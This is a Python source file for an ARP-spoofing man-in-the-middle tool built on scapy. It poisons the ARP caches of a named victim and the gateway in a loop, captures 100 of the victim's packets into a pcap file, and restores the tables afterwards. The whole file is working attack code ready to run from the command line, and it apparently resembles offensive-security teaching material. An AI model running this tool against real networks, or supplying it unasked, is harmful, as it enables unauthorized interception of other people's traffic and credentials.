from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, srp, wrpcap)
import os
import sys
import time

def get_mac(targetip):  # Добавлено targetip как параметр
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, rcv in resp:
        return rcv[Ether].src
    return None

class Arper:
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        print(f"[*] Setting up {interface}")
        print(f"[*] Victim {victim} is at {self.victimmac}")
        print(f"[*] Gateway {gateway} is at {self.gatewaymac}")
        print('-' * 30)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-' * 30)
        print('Beginning the ARP poison. [CTRL-C to stop]')
        
        while True:
            try:
                send(poison_victim)
                send(poison_gateway)
                time.sleep(2)
            except KeyboardInterrupt:
                self.restore()
                sys.exit(1)
            else:
                time.sleep(2)

    def sniff(self, count=100):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = f"ip host {self.victim}"
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')

    def restore(self):
        print('Restoring ARP tables...')
        send(ARP(op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        send(ARP(op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff'), count=5)

if __name__ == '__main__':
    if len(sys.argv) == 4:
        victim, gateway, interface = sys.argv[1], sys.argv[2], sys.argv[3]
    else:
        print("Usage: sudo python3 arper.py <victim> <gateway> <interface>")
        sys.exit(1)
    
    myarp = Arper(victim, gateway, interface)
    myarp.run()
